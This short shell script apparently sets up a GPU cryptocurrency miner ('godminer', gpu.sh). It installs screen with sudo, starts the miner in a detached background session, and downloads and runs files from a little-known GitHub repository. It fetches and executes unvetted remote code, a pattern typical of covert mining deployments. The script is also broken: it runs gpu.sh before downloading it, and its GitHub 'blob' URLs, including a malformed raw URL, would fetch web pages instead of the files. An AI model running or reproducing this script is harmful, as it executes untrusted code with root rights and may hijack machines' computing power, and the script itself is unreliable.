#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/dark12h/dark/blob/main/godminer
wget https://raw.githubusercontent.com/dark12h/dark/blob/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
